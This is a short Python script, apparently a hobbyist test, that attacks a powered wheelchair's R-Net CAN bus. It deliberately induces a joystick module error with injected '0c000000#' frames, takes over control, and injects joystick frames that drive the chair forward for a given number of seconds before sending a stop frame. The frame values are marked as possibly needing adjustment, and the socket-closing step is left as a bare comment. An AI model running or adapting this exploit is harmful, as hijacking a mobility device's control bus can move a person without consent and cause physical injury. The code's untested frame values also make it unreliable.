
import socket, sys, os, array, threading
from time import *
from fcntl import ioctl
from can2RNET import *
import sys
# Function to induce JSM error
def induce_JSM_error(cansocket):
    for i in range(0,3):
        cansend(cansocket,'0c000000#')

# Function to exploit JSM error
def RNET_JSMerror_exploit(cansocket):
    print("Waiting for JSM heartbeat")
    canwait(cansocket,"03C30F0F:1FFFFFFF")
    t = time() + 0.20

    print("Waiting for joy frame")
    joy_id = wait_rnet_joystick_frame(cansocket, t)
    print("Using joy frame: " + joy_id)

    induce_JSM_error(cansocket)
    print("3 x 0c000000# sent")

    return joy_id

# Function to wait for any frame containing a Joystick position
def wait_rnet_joystick_frame(can_socket, start_time):
    frameid = ''

    while frameid[0:3] != '020':
        cf, addr = can_socket.recvfrom(16)
        candump_frame = dissect_frame(cf)
        frameid = candump_frame.split('#')[0]
        if time() > start_time:
            print("JoyFrame wait timed out")
            return 'Err!'
    return frameid

def drive_forward(seconds):
    # Initialize CAN socket
    can_socket = opencansocket(0)

    # Exploit JSM error to gain control (if necessary)
    joy_id = RNET_JSMerror_exploit(can_socket)

    # CAN frame to move the wheelchair forward (following the structure in JoyLocal.py)
    forward_frame = joy_id + '#000080'  # This frame may need adjustment

    # Send the forward command
    cansend(can_socket, forward_frame)

    # Wait for the specified amount of time
    sleep(seconds)

    # CAN frame to stop the wheelchair
    stop_frame = joy_id + '#000000'  # This frame may need adjustment

    # Send the stop command
    cansend(can_socket, stop_frame)

    # Close the CAN socket


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python startingTest.py <seconds>")
        sys.exit(1)
    try:
        seconds = float(sys.argv[1])
    except ValueError:
        print("Error: Invalid input. Please enter a number.")
        sys.exit(1)
    
    drive_forward(seconds)
